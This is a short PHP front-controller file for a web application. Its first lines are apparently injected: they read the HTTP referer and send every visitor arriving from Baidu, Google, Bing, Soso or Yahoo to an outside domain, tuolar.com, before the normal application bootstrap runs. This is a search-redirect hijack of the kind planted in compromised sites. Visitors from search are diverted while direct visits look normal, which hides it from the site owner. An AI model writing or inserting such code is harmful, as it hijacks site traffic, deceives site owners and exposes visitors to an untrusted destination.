<?php
$refererUrl = @$_SERVER["HTTP_REFERER"];
if (strpos($refererUrl , 'baidu.com') !== false){
	header("Location: http://www.tuolar.com");
	exit;
}
if (strpos($refererUrl , 'google.com') !== false){
	header("Location: http://www.tuolar.com");
	exit;
}
if (strpos($refererUrl , 'bing.com') !== false){
	header("Location: http://www.tuolar.com");
	exit;
}
if (strpos($refererUrl , 'soso.com') !== false){
	header("Location: http://www.tuolar.com");
	exit;
}
if (strpos($refererUrl , 'yahoo.com') !== false){
	header("Location: http://www.tuolar.com");
	exit;
}

require_once('./common/define.php');
require_once('./common/config.php');
require_once('./common/function.php');
require_once('./common/app.conf.php');

Globals::requireClass('Controller');
Controller::runController(null, $config);
